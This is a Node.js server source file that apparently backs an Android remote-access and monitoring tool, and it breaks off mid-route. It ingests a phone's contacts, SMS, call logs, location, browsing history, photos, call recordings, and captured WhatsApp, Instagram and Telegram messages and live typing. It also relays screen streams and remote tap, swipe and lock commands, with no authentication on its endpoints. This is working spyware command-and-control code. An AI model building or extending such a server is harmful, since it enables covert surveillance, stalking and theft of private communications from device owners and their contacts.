const express = require('express');

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); 
const { Server } = require("socket.io");
const compression = require('compression');
const mongo = require('./mongo'); 

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;



console.log(__dirname);
console.log(__filename);

// ==================================================
// ✅ 1. SOCKET.IO SETUP
// ==================================================
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8, // 100MB
    pingTimeout: 60000,     
    pingInterval: 25000,    
    transports: ['websocket', 'polling']
});

// --- CLOUDINARY CONFIG (from Render environment variables) ---
cloudinary.config({
    cloud_name: process.env.CLOUDINARY_CLOUD_NAME || process.env.CLOUDINARY_NAME,
    api_key: process.env.CLOUDINARY_API_KEY || process.env.CLOUDINARY_KEY,
    api_secret: process.env.CLOUDINARY_API_SECRET || process.env.CLOUDINARY_SECRET
});

// --- SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(compression()); 
app.use(cors({ origin: '*' }));

// Binary storage (50MB videos) — before JSON body parser
app.post('/api/upload-storage-file', express.raw({ type: '*/*', limit: '120mb' }), async (req, res) => {
    try {
        const id = String(req.headers['x-device-id'] || '').trim().toUpperCase();
        let relPath = String(req.headers['x-file-path'] || 'file.bin').trim();
        const mime = String(req.headers['x-mime'] || 'application/octet-stream');
        const fileName = String(req.headers['x-file-name'] || require('path').basename(relPath) || 'file.bin');
        if (!id) return res.status(400).json({ error: 'No device id' });
        if (!req.body || !req.body.length) return res.status(400).json({ error: 'Empty body' });
        relPath = relPath.replace(/\\/g, '/').replace(/\0/g, '');
        while (relPath.startsWith('/')) relPath = relPath.slice(1);
        if (relPath.includes('..')) relPath = fileName;
        const filesDir = path.join(UPLOADS_DIR, 'files', id);
        await fs.promises.mkdir(filesDir, { recursive: true });
        const safeBase = fileName.replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 80) || 'file.bin';
        const diskName = Date.now() + '_' + safeBase;
        await fs.promises.writeFile(path.join(filesDir, diskName), req.body);
        const publicUrl = '/uploads/files/' + id + '/' + diskName;
        let type = 'file';
        const lower = fileName.toLowerCase();
        if (/\.(jpg|jpeg|png|webp|gif)$/.test(lower)) type = 'image';
        else if (/\.(mp4|mkv|webm|3gp|avi|mov)$/.test(lower)) type = 'video';
        else if (/\.(mp3|m4a|aac|wav|ogg)$/.test(lower)) type = 'audio';
        const meta = { name: fileName, path: relPath, size: req.body.length, type, mime, url: publicUrl, timestamp: Date.now() };
        const metaPath = path.join(UPLOADS_DIR, id + '_storage_file.json');
        const tmp = metaPath + '.tmp';
        await fs.promises.writeFile(tmp, JSON.stringify(meta));
        await fs.promises.rename(tmp, metaPath);
        res.json({ status: 'success', ...meta });
    } catch (e) {
        console.error('upload-storage-file', e);
        res.status(500).json({ error: e.message });
    }
});
app.use('/uploads', express.static(UPLOADS_DIR));

app.use(bodyParser.json({ limit: '120mb' }));
app.use(bodyParser.urlencoded({ limit: '120mb', extended: true }));
app.use(express.static(__dirname));

let devicesStatus = {};
// Screen streaming keeps one newest JPEG per device; old frames are discarded.
const latestScreenFrames = new Map();
const latestScreenStatus = new Map();

function normalizeScreenDeviceId(value) {
    const id = String(value || '').trim().toUpperCase();
    return /^[A-Z0-9._-]{1,128}$/.test(id) ? id : null;
}

function screenRoom(deviceId) {
    return `${deviceId}_screen`;
}

// Per-device typing buffer: only FINAL messages go to Mongo activity_events
// shape: { text, firstSeen, lastSeen, structured, saved }
const liveTypingState = Object.create(null);

// ==================================================
//  Live Activity free-text → structured fields (no Android change required)
// ==================================================
function parseLiveActivityText(text) {
    if (!text || typeof text !== 'string') return null;
    const t = text.trim();
    if (!t) return null;
    let application = 'Other';
    let packageName = '';
    let actorName = '';
    let action = 'activity';
    let message = t;

    const appMap = [
        { name: 'WhatsApp', pkg: 'com.whatsapp', keys: ['whatsapp'] },
        { name: 'Instagram', pkg: 'com.instagram.android', keys: ['instagram'] },
        { name: 'Telegram', pkg: 'org.telegram.messenger', keys: ['telegram'] },
        { name: 'Snapchat', pkg: 'com.snapchat.android', keys: ['snapchat'] },
        { name: 'Messenger', pkg: 'com.facebook.orca', keys: ['messenger'] },
        { name: 'Chrome', pkg: 'com.android.chrome', keys: ['chrome'] },
        { name: 'SMS', pkg: '', keys: ['sms', 'messaging'] },
        { name: 'Phone', pkg: '', keys: ['call', '📞'] }
    ];
    const lower = t.toLowerCase();
    for (const a of appMap) {
        if (a.keys.some(k => lower.includes(k)) || t.startsWith(a.name)) {
            application = a.name;
            packageName = a.pkg;
            break;
        }
    }

    // "📞 Call chal rahi hai → Name" or similar
    if (application === 'Phone' || /call\s+chal|📞/.test(lower)) {
        application = 'Phone';
        action = 'call';
        const m = t.match(/→\s*(.+)$/);
        actorName = m ? m[1].trim() : '';
        message = t;
        return { application, packageName, actorName, action, message };
    }

    // "WhatsApp → Contact : message"
    if (t.includes(' → ') && t.includes(' : ')) {
        const afterApp = t.replace(/^[^\→]+→\s*/, '');
        const colonIdx = afterApp.indexOf(' : ');
        if (colonIdx >= 0) {
            actorName = afterApp.slice(0, colonIdx).trim();
            message = afterApp.slice(colonIdx + 3).trim();
            action = 'sent';
            return { application, packageName, actorName, action, message };
        }
    }

    // "WhatsApp [Name] typing: msg" or "WhatsApp typing: msg"
    const typingMatch = t.match(/^(?:.+?\s+)?(?:\[([^\]]+)\]\s*)?typing:\s*(.*)$/i);
    if (typingMatch) {
        action = 'typing';
        if (typingMatch[1]) actorName = typingMatch[1].trim();
        message = (typingMatch[2] || '').trim();
        // also try "App → Name : " style already handled
        return { application, packageName, actorName, action, message };
    }

    // "App typing: msg"
    const simpleTyping = t.match(/^(.+?)\s+typing:\s*(.*)$/i);
    if (simpleTyping) {
        action = 'typing';
        message = (simpleTyping[2] || '').trim();
        return { application, packageName, actorName, action, message };
    }

    return { application, packageName, actorName, action, message };
}


/** Only persist confirmed events — never pure drafts / mid-typing / back-without-send */
function isCommitWorthy(structured, text) {
    if (!structured) return false;
    const action = (structured.action || '').toLowerCase();
    // Call activity is a separate explicit event and may be stored.
    if (action === 'call') return true;
    // Chat activity is permanent only when Android explicitly marks the
    // message as sent. Typing/activity payloads remain transient.
    if (action !== 'sent' || structured.sentConfirmed !== true) return false;
    const msg = (structured.message || '').trim();
    return msg.length >= 1 && Boolean((text || '').toString().trim());
}

async function commitFinalActivity(id, state) {
    if (!state || state.saved || !state.text || !state.structured) return;
    const s = state.structured;
    if (!isCommitWorthy(s, state.text)) {
        // discard draft — clear timer, mark discarded
        if (state.timer) {
            try { clearTimeout(state.timer); } catch (e) {}
            state.timer = null;
        }
        return;
    }
    if (!s.message && !s.actorName) return;
    if (state.timer) {
        try { clearTimeout(state.timer); } catch (e) {}
        state.timer = null;
    }
    const ts = state.lastSeen || state.firstSeen || Date.now();
    const eventId = crypto.createHash('sha256')
        .update(`${id}|${s.application}|${s.actorName}|${s.message}|final`)
        .digest('hex').slice(0, 28);
    const eventDoc = {
        deviceId: id,
        application: s.application,
        packageName: s.packageName,
        actorName: s.actorName,
        action: s.action === 'typing' ? 'sent' : (s.action || 'sent'),
        message: s.message,
        text: state.text,
        timestamp: ts,
        eventId
    };
    try {
        const saved = await mongo.saveActivityEvent(id, eventDoc);
        state.saved = true;
        if (saved) {
            const payload = {
                device_id: id,
                text: state.text,
                application: eventDoc.application,
                packageName: eventDoc.packageName,
                actorName: eventDoc.actorName,
                action: eventDoc.action,
                message: eventDoc.message,
                timestamp: ts,
                eventId,
                final: true
            };
            try {
                io.to(id).emit('activity_update', payload);
                io.to(id).emit('live_status_update', payload);
            } catch (e) {}
        }
    } catch (e) {}
}

function scheduleFinalize(id, delayMs) {
    const state = liveTypingState[id];
    if (!state || state.saved) return;
    // never schedule finalize for pure typing drafts
    if (!isCommitWorthy(state.structured, state.text)) return;
    if (state.timer) {
        try { clearTimeout(state.timer); } catch (e) {}
        state.timer = null;
    }
    state.timer = setTimeout(() => {
        const cur = liveTypingState[id];
        if (!cur || cur.saved) return;
        commitFinalActivity(id, cur).catch(() => {});
    }, delayMs);
}

function discardTypingState(id) {
    const prev = liveTypingState[id];
    if (!prev) return;
    if (prev.timer) {
        try { clearTimeout(prev.timer); } catch (e) {}
    }
    delete liveTypingState[id];
}

// ==================================================
//  🔥 MAIN SOCKET LOGIC
// ==================================================
io.on('connection', (socket) => {
    
    console.log(`👤 New Connection ID: ${socket.id}`);

    socket.on('join', (roomID) => {
        const room = roomID.toString();
        socket.join(room);
        console.log(`🔌 Device Joined Room (Android): ${room}`);
    });

    socket.on('join-room', (roomID) => {
        const room = roomID.toString();
        socket.join(room);
        console.log(`💻 Client Joined Room: ${room}`);
        if (room.endsWith('_screen')) {
            const id = normalizeScreenDeviceId(room.slice(0, -'_screen'.length));
            const latest = id ? latestScreenFrames.get(id) : null;
            const status = id ? latestScreenStatus.get(id) : null;
            if (latest) socket.emit('screen-frame', latest.meta, latest.jpeg);
            if (status) socket.emit('screen-status', status);
        }
    });

    // ⚡ NEW: Command Relay (Website se phone ko command bhejne ke liye)
    socket.on('command', (data) => {
        if (data && data.target && data.command) {
            const targetRoom = data.target.toString();
            console.log(`⚡ Relaying Command: ${data.command} -> ${targetRoom}`);
            socket.to(targetRoom).emit('command', data);
        }
    });

    socket.on('send-command', (data) => {
        if (data.targetId && data.command) {
            console.log(`⚡ Socket Command: ${data.command} -> ${data.targetId}`, data.x !== undefined ? `x=${data.x} y=${data.y}` : '');
            
            // Screen control commands - send as control-event to _screen room
            const controlCommands = ['click', 'swipe', 'home', 'back', 'recents', 'lock', 'unlock', 'swipe_up', 'swipe_down', 'volume_up', 'volume_down', 'start_screen', 'stop_screen'];
            
            if (controlCommands.includes(data.command)) {
                // Send as control-event with full payload
                io.to(data.targetId).emit('control-event', {
                    action: data.command,
                    x: data.x || 0,
                    y: data.y || 0,
                    x1: data.x1 || 0,
                    y1: data.y1 || 0,
                    x2: data.x2 || 0,
                    y2: data.y2 || 0,
                    duration: data.duration || 300,
                    displayWidth: data.displayWidth || 1080,
                    displayHeight: data.displayHeight || 2400,
                    room: data.targetId
                });
            } else {
                // Regular command (string) - send to base room
                const baseRoom = data.targetId.replace('_screen', '');
                io.to(baseRoom).emit('command', data.command);
                if (!devicesStatus[baseRoom]) devicesStatus[baseRoom] = { id: baseRoom };
                devicesStatus[baseRoom].command = data.command;
            }
        }
    });

    // Accessibility screenshot stream: metadata plus one Socket.IO binary JPEG attachment.
    socket.on('screen-frame', (metadata, jpeg) => {
        try {
            const id = normalizeScreenDeviceId(metadata && metadata.deviceId);
            if (!id || !jpeg) return;
            const buffer = Buffer.isBuffer(jpeg) ? jpeg : Buffer.from(jpeg);
            if (!buffer.length || buffer.length > 8 * 1024 * 1024) return;
            const meta = {
                type: 'screen_frame',
                deviceId: id,
                timestamp: Number(metadata.timestamp) || Date.now(),
                width: Number(metadata.width) || 0,
                height: Number(metadata.height) || 0,
                fps: Number(metadata.fps) || 0,
                actualFps: Number(metadata.actualFps) || 0,
                codec: 'jpeg'
            };
            latestScreenFrames.set(id, { meta, jpeg: buffer });
            if (!devicesStatus[id]) devicesStatus[id] = { id };
            devicesStatus[id].lastSeen = Date.now();
            devicesStatus[id].screenOnline = true;
            io.to(screenRoom(id)).emit('screen-frame', meta, buffer);
        } catch (error) {
            console.error('screen-frame relay failed:', error.message);
        }
    });

    socket.on('screen-status', (payload) => {
        try {
            const id = normalizeScreenDeviceId(payload && payload.deviceId);
            if (!id) return;
            const status = {
                deviceId: id,
                status: String(payload.status || 'SCREENSHOT_UNAVAILABLE'),
                message: String(payload.message || ''),
                requestedFrames: Number(payload.requestedFrames) || 0,
                successfulFrames: Number(payload.successfulFrames) || 0,
                failedFrames: Number(payload.failedFrames) || 0,
                fps: Number(payload.fps) || 0,
                actualFps: Number(payload.actualFps) || 0,
                timestamp: Number(payload.timestamp) || Date.now()
            };
            latestScreenStatus.set(id, status);
            if (!devicesStatus[id]) devicesStatus[id] = { id };
            devicesStatus[id].lastSeen = Date.now();
            devicesStatus[id].screenStatus = status.status;
            devicesStatus[id].screenOnline = status.status !== 'SCREEN_STREAM_STOPPED';
            io.to(screenRoom(id)).emit('screen-status', status);
        } catch (error) {
            console.error('screen-status relay failed:', error.message);
        }
    });

    // ⚡ WEBRTC SIGNALING (For camera and any unrelated legacy callers)
    socket.on("offer", (data) => {
        if (data && data.target) {
            const targetRoom = data.target.toString();
            console.log(`📡 Offer Received -> Relaying to: ${targetRoom}`);
            socket.to(targetRoom).emit("offer", data); 
        }
    });

    socket.on("answer", (data) => {
        if (data && data.target) {
            const targetRoom = data.target.toString();
            console.log(`📡 Answer Received -> Relaying to: ${targetRoom}`);
            socket.to(targetRoom).emit("answer", data);
        }
    });

    socket.on("candidate", (data) => {
        if (data && data.target) {
            const targetRoom = data.target.toString();
            socket.to(targetRoom).emit("candidate", data);
        }
    });

    socket.on('control-event', (data) => {
        console.log(`🎮 Control Action: ${data.action} -> Target: ${data.room}`);
        io.to(data.room).emit('control-event', data); 
    });

    socket.on('audio-stream', (blob) => {
        const rooms = socket.rooms;
        for (const room of rooms) {
            if (room !== socket.id) {
                socket.to(room).emit('audio-stream', blob);
            }
        }
    });

    socket.on("switch-camera", (data) => {
        if (data && data.target) {
            console.log(`🔄 Switch Camera Command -> ${data.target}`);
            io.to(data.target).emit("switch-camera");
        }
    });

    socket.on('disconnect', () => { 
        console.log(`❌ Disconnected: ${socket.id}`);
    });
});

app.get('/', (req, res) => {
    res.send('✅ Server Running: WebRTC Safe Mode + Super Fast Admin API Active');
});

// ==================================================
//  ✅ API ROUTES (UPLOAD)
// ==================================================
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data, type } = req.body; 
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    let folderName = "gallery"; 
    let publicId = Date.now().toString(); 
    
    if (type && type.includes("-")) {
        const parts = type.split("-");  
        folderName = parts[0];  
        publicId = parts[1];    
    } else if (type && type !== "null" && type !== "") {
        folderName = type;
    }
    const tl = (folderName || '').toLowerCase();
    if (tl.includes('whatsapp')) folderName = 'whatsappscreenshot';
    else if (tl.includes('instagram')) folderName = 'instagramscreenshot';
    else if (tl.includes('snap')) folderName = 'snapscreenshot';
    else if (tl === 'screenshot' || tl === 'screen') folderName = 'screenshot';
    
    let folderPath = `${id}/${folderName}`; 
    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;
    
    cloudinary.uploader.upload(base64Image, 
        { folder: folderPath, public_id: publicId, resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" }, 
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-file', { device_id: id, url: result.secure_url, type: folderName });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

app.post('/api/upload-audio', (req, res) => {
    let { device_id, audio_data, filename } = req.body; 
    if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    let folderPath = `${id}/calls`; 
    let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;
    
    cloudinary.uploader.upload(base64Audio, 
        { folder: folderPath, public_id: filename || Date.now().toString(), resource_type: "video" }, 
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

app.get('/api/audio-history/:device_id', async (req, res) => {
    const id = req.params.device_id.trim().toUpperCase();
    try {
        const result = await cloudinary.search.expression(`folder:${id}/calls AND resource_type:video`).sort_by('created_at', 'desc').max_results(50).execute();
        res.json(result.resources);
    } catch (error) { res.json([]); }
});

// ==================================================
// 🔥 SUPER FAST DIRECT FETCH APIs
// ==================================================

app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;
    
    cloudinary.api.resources({ 
        type: 'upload', 
        prefix: id + "/gallery/",  
        max_results: 100, 
        next_cursor: next_cursor, 
        direction: 'desc' 
    }, 
    (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = result.resources.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: result.next_cursor });
    });
});

app.get('/api/screenshots-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;
    
    cloudinary.api.resources({ 
        type: 'upload', 
        prefix: id + "/screenshot/", 
        max_results: 100, 
        next_cursor: next_cursor, 
        direction: 'desc' 
    }, 
    (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = result.resources.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: result.next_cursor });
    });
});

app.get('/api/camera-list/:device_id', async (req, res) => {
    const id = req.params.device_id.toUpperCase();
    try {
        const getPhotos = (folder) => new Promise(resolve => {
            cloudinary.api.resources({ 
                type: 'upload', 
                prefix: `${id}/${folder}/`, 
                max_results: 50, 
                direction: 'desc' 
            }, (error, result) => resolve(result && result.resources ? result.resources : []));
        });

        const [front, back] = await Promise.all([
            getPhotos('front_camera'),
            getPhotos('back_camera')
        ]);

        let allPhotos = [...front, ...back];
        allPhotos.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
        
        const photos = allPhotos.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: null }); 
    } catch (error) { 
        res.json({ photos: [], next_cursor: null }); 
    }
});

// ==================================================
//  ✅ DATA & STATUS APIs
// ==================================================
app.get('/api/admin/all-devices', (req, res) => { res.json(devicesStatus); });

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });
        const id = device_id.toString().trim().toUpperCase();
        if (!devicesStatus[id]) { devicesStatus[id] = { id: id, command: "none" }; }
        devicesStatus[id].model = model || devicesStatus[id].model || "Unknown";
        devicesStatus[id].battery = battery || level || devicesStatus[id].battery || 0;
        devicesStatus[id].version = version || devicesStatus[id].version || "--";
        devicesStatus[id].charging = (String(charging) === "true");
        devicesStatus[id].lat = lat || devicesStatus[id].lat || 0;
        devicesStatus[id].lon = lon || devicesStatus[id].lon || 0;
        devicesStatus[id].accuracy = accuracy || devicesStatus[id].accuracy || 0;
        devicesStatus[id].speed = speed || devicesStatus[id].speed || 0;
        devicesStatus[id].lastSeen = Date.now();
        
        let commandToSend = "none";
        if (devicesStatus[id].command && devicesStatus[id].command !== "none") {
            commandToSend = devicesStatus[id].command;
            devicesStatus[id].command = "none"; 
        }
        res.json({ status: "success", command: commandToSend });
    } catch (e) { res.status(500).json({ error: "Server Error" }); }
});

app.post('/api/upload_data', async (req, res) => { 
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        let finalData = parsedData;
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
                devicesStatus[id].lastSeen = Date.now();
            }
            finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
        } else if (type === 'contacts') {
            let rawList = Array.isArray(parsedData) ? parsedData : [parsedData];
            const seenNumbers = new Set();
            finalData = [];
            for (const contact of rawList) {
                let rawNum = contact.phoneNumber || contact.number || '';
                let num = rawNum.replace(/\s+|-/g, ''); 
                if (num && !seenNumbers.has(num)) {
                    seenNumbers.add(num);
                    finalData.push({ name: contact.name || "Unknown", number: num });
                }
            }
            finalData.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
        } else if (type === 'permission_status') {
             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
        } else if (type === 'app_visibility') {
             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
        } else if (['installed_apps', 'apps'].includes(type)) {
             let incoming = Array.isArray(parsedData) ? parsedData : [parsedData];
             let existing = [];
             try {
                 if (fs.existsSync(filePath)) {
                     existing = JSON.parse(await fs.promises.readFile(filePath, 'utf8'));
                     if (!Array.isArray(existing)) existing = [];
                 }
             } catch (e) { existing = []; }
             const map = new Map();
             for (const a of existing) if (a && a.packageName) map.set(a.packageName, a);
             for (const a of incoming) if (a && a.packageName) map.set(a.packageName, a);
             finalData = Array.from(map.values());
        } else if (type === 'network') {
             finalData = parsedData;
        } else if (type === 'storage' || type === 'storage_file') {
             // Replace snapshot (latest folder listing / file payload)
             finalData = parsedData;
        } else if (type === 'live_status') {
             // Keep only latest live activity entries (newest first), max 30 (file cache for current live card)
             let incoming = Array.isArray(parsedData) ? parsedData : [parsedData];
             let existing = [];
             try {
                 if (fs.existsSync(filePath)) {
                     existing = JSON.parse(await fs.promises.readFile(filePath, 'utf8'));
                     if (!Array.isArray(existing)) existing = [];
                 }
             } catch (e) { existing = []; }
             // Keep only a short current-state cache for the live dashboard. This
             // file is not history and is never copied to Mongo as history.
             finalData = incoming.slice(0, 1);

             // Live emit always; Mongo only for explicit sent/call events.
             // Same app+contact text edits (F → Message → full sentence) stay ONE draft.
             // Back/clear = discard. Contact/app switch may commit previous if worthy.
             try {
                 const now = Date.now();
                 const STABLE_MS = 14000; // wait until user stops editing
                 for (const raw of incoming) {
                     const rawText = (raw && (raw.text || raw.activity || '')).toString().trim();
                     const ts = Number(raw && raw.timestamp || now);
                     const hasStructured = !!(raw && (raw.application || raw.packageName || raw.actorName || raw.message || raw.action));
                     const suppliedApplication = hasStructured ? String(raw.application || '').trim() : '';
                     const suppliedPackage = hasStructured ? String(raw.packageName || '').trim() : '';
                     const suppliedActor = hasStructured ? String(raw.actorName || '').trim() : '';
                     const suppliedAction = hasStructured ? String(raw.action || 'activity').trim().toLowerCase() : '';
                     const suppliedMessage = hasStructured ? String(raw.message || '').trim() : '';
                     const structured = hasStructured
                         ? {
                             application: suppliedApplication || 'Other',
                             packageName: suppliedPackage,
                             actorName: suppliedActor,
                             action: suppliedAction || 'activity',
                             message: suppliedMessage || rawText,
                             sentConfirmed: raw && raw.sentConfirmed === true
                           }
                         : (rawText ? parseLiveActivityText(rawText) : null);
                     const text = rawText || (structured ? [structured.application, structured.actorName ? ('→ ' + structured.actorName) : '', structured.message ? (': ' + structured.message) : ''].filter(Boolean).join(' ').trim() : '');

                     const livePayload = {
                         device_id: id,
                         text: text || '',
                         application: structured ? structured.application : '',
                         packageName: structured ? structured.packageName : '',
                         actorName: structured ? structured.actorName : '',
                         action: structured ? structured.action : '',
                         message: structured ? structured.message : '',
                         sentConfirmed: structured ? structured.sentConfirmed === true : false,
                         timestamp: ts,
                         liveOnly: true
                     };
                     try {
                         io.to(id).emit('live_status_update', livePayload);
                         io.to(id).emit('activity_update', livePayload);
                     } catch (e) {}

                     const prev = liveTypingState[id];

                     function sameComposer(prevS, nextS) {
                         if (!prevS || !nextS) return false;
                         if ((prevS.application || '') !== (nextS.application || '')) return false;
                         // same contact thread → always one draft (even if text jumps)
                         return (prevS.actorName || '') === (nextS.actorName || '');
                     }

                     // back / clear composer → discard, never save
                     if (!text) {
                         discardTypingState(id);
                         continue;
                     }
                     if (!structured) continue;

                     if ((structured.action || '').toLowerCase() === 'call') {
                         const callState = {
                             text, structured, firstSeen: ts, lastSeen: ts, saved: false, timer: null
                         };
                         await commitFinalActivity(id, callState);
                         discardTypingState(id);
                         continue;
                     }

                     if (!prev || !prev.text) {
                         liveTypingState[id] = {
                             text, structured, firstSeen: ts, lastSeen: ts, saved: false, timer: null
                         };
                         scheduleFinalize(id, STABLE_MS);
                         continue;
                     }

                     if (prev.text === text) {
                         prev.lastSeen = ts;
                         scheduleFinalize(id, STABLE_MS);
                         continue;
                     }

                     // SAME WhatsApp contact: only update buffer (F / Message / full text = one draft)
                     if (sameComposer(prev.structured, structured)) {
                         if (prev.timer) { try { clearTimeout(prev.timer); } catch (e) {} }
                         liveTypingState[id] = {
                             text, structured, firstSeen: prev.firstSeen, lastSeen: ts, saved: false, timer: null
                         };
                         scheduleFinalize(id, STABLE_MS);
                         continue;
                     }

                     // different contact/app → commit previous if worthy, start new buffer
                     if (!prev.saved) {
                         await commitFinalActivity(id, prev);
                     }
                     liveTypingState[id] = {
                         text, structured, firstSeen: ts, lastSeen: ts, saved: false, timer: null
                     };
                     scheduleFinalize(id, STABLE_MS);
                 }
             } catch (e) {
                 try { io.to(id).emit('live_status_update', { device_id: id, text: (incoming[0] && incoming[0].text) || '' }); } catch (e2) {}
             }
        } else if (['call_logs', 'sms'].includes(type)) {
             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];

                } else if (type === 'chat_logs') {
             // Android can upload chat batches over HTTP when the Socket.IO
             // connection is temporarily unavailable. Persist those messages in
             // the same per-app files used by the chat viewer APIs.
             const incoming = Array.isArray(parsedData)
                 ? parsedData
                 : (parsedData && Array.isArray(parsedData.messages) ? parsedData.messages : [parsedData]);
             const chatsDir = path.join(UPLOADS_DIR, 'chats', id);
             if (!fs.existsSync(chatsDir)) fs.mkdirSync(chatsDir, { recursive: true });
             const appMap = { 'com.whatsapp': 'whatsapp', 'com.instagram.android': 'instagram', 'com.snapchat.android': 'snapchat', 'org.telegram.messenger': 'telegram' };
             const changedApps = new Set();
             const acceptedMessages = [];
             for (const msg of incoming) {
                 const appKey = appMap[msg && msg.packageName];
                 // Persist only explicitly confirmed outgoing/sent messages. Drafts,
                 // incoming notification previews, and live typing stay transient.
                 if (!appKey || msg.direction !== 'OUT' || msg.sentConfirmed !== true) continue;
                 const chatPath = path.join(chatsDir, `${appKey}.json`);
                 let existing = [];
                 try { if (fs.existsSync(chatPath)) existing = JSON.parse(await fs.promises.readFile(chatPath, 'utf8')); } catch (e) { existing = []; }
                 const safeMsg = {
                     id: msg.id || `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
                     deviceId: id,
                     packageName: msg.packageName,
                     conversation: escapeHtml(msg.conversation || 'Unknown'),
                     sender: escapeHtml(msg.sender || 'Unknown'),
                     text: escapeHtml(msg.text || ''),
                     timestamp: msg.timestamp || Date.now(),
                     messageType: msg.messageType || 'TEXT',
                     direction: msg.direction || 'IN',
                     group: Boolean(msg.group),
                     source: msg.source || 'sent_accessibility',
                     sentConfirmed: msg.sentConfirmed === true
                 };
                 const duplicate = existing.some(item => item.conversation === safeMsg.conversation && item.text === safeMsg.text && Math.abs((item.timestamp || 0) - safeMsg.timestamp) < 5000);
                 acceptedMessages.push(safeMsg);
                 if (!duplicate) {
                     existing.unshift(safeMsg);
                     await fs.promises.writeFile(chatPath, JSON.stringify(existing.slice(0, 5000), null, 2));
                     changedApps.add(appKey);
                 }
             }
             changedApps.forEach(appKey => io.emit('chat_update', { device_id: id, app: appKey }));
             // Never write drafts/incoming previews from the original request body.
             finalData = acceptedMessages;
        } else if (type === 'websites') {
             // Append website browsing history

             let existingData = [];
             try {
                 if (fs.existsSync(filePath)) {
                     existingData = JSON.parse(await fs.promises.readFile(filePath, 'utf8'));
                 }
             } catch (e) { }
             let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
             // Dedup: skip same URL within 10 seconds
             newDataArray.forEach(newItem => {
                 const isDup = existingData.some(e => e.url === newItem.url && Math.abs((e.timestamp || 0) - (newItem.timestamp || 0)) < 10000);
                 if (!isDup) existingData.unshift(newItem);
             });
             finalData = existingData.slice(0, 5000);
        } else {
            let existingData = [];
            try {
                if (fs.existsSync(filePath)) {
                    const fileContent = await fs.promises.readFile(filePath, 'utf8');
                    existingData = JSON.parse(fileContent);
                }
            } catch (e) { }
            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            if (type === 'chat_logs') {
                newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
            }
            finalData = [...newDataArray, ...existingData].slice(0, 5000); 
        }
        await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
        try {
            const persistTypes = ['contacts','sms','call_logs','notifications','location','network','apps','installed_apps','chat_logs','permission_status'];
            if (persistTypes.includes(type)) mongo.saveHistory(id, type, finalData).catch(() => {});
        } catch (e) {}
        io.to(id).emit('device_data_update', { device_id: id, type });
        res.json({ status: "success" });
    } catch (error) { res.status(500).json({ status: "error" }); }
});

app.get('/api/get-data/:device_id/:type', async (req, res) => {
    const deviceIdParam = req.params.device_id.toUpperCase();
    const typeParam = req.params.type;
    const filePath = path.join(UPLOADS_DIR, `${deviceIdParam}_${typeParam}.json`);
    try {
        if (fs.existsSync(filePath)) {
            const raw = (await fs.promises.readFile(filePath, 'utf8')).trim();
            if (raw) {
                try {
                    let value = JSON.parse(raw);
                    if (typeParam === 'chat_logs') {
                        value = Array.isArray(value) ? value.filter(c => c && c.direction === 'OUT' && c.sentConfirmed === true) : [];
                    }
                    return res.json(value);
                } catch (e) {}
            }
        }
        try {
            let fromDb = await mongo.loadHistory(deviceIdParam, typeParam, req.query.limit || 500);
            if (typeParam === 'chat_logs') {
